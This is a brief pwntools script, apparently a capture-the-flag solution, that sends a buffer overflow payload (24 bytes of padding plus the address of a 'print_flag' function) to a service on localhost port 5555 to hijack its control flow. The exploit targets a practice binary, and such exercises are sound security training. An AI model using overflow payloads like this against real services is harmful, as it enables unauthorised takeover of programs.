
from pwn import *

r = remote('localhost', 5555)


r.readline()

print_flag = 0x4011f7

p = cyclic(24)
p += p64(print_flag)

r.sendline(p)

print(r.recv())
print(r.recv())